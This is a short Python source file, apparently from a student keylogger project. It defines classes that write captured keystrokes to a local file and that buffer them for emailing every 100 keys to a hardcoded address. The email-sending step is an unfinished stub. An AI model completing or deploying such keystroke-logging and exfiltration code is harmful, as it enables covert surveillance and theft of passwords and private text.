# different ways of logging the keystrokes
class WriteToFile:
    def __init__(self, file="keystrokes.txt"):
        self.file = file

        # initialise new file
        with open(file, 'w'):
            pass

    def log(self, key):
        with open(self.file, 'a') as file:
            file.write(key + "\n")

class Email:
    def __init__(self, email="z5161179@student.unsw.edu.au"):
        self.email = email
        self.keys = "" # all stored keystrokes
        self.count = 0 # how many keystrokes.

    def log(self, key):
        self.keys += key + " | " # add keystroke
        self.count += 1

        # send an email every 100 keystrokes
        if self.count%100 == 0:
            self.sendEmail()

    # TODO:
    def sendEmail(self):
        pass
        print(self.keys)